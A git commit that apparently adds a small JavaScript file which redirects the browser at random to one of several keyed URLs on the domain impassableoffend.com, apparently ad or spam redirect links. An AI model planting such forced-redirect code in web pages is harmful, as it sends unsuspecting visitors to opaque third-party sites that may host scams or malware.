b3a58120f066e070bacc5cd9722c3e1af1dd8ee6
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-06-04 21:02:11 +0700

    Create akeadssgbng11.js

---
+++ akeadssgbng11.js
@@ -0,0 +1,12 @@
+var dataUrl = [
+
+'https://impassableoffend.com/wm7iwsud?key=c58d4480f77de413dbf6bc98b7eaee87',
+'https://impassableoffend.com/wm7iwsud?key=c58d4480f77de413dbf6bc98b7eaee87',
+'https://impassableoffend.com/wm7iwsud?key=c58d4480f77de413dbf6bc98b7eaee87',
+'https://impassableoffend.com/wm7iwsud?key=c58d4480f77de413dbf6bc98b7eaee87',
+'https://impassableoffend.com/w4r4pvtwaa?key=62ac92c7c5426fdf3bf3ae0076548fa8',
+'https://impassableoffend.com/w4r4pvtwaa?key=62ac92c7c5426fdf3bf3ae0076548fa8'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
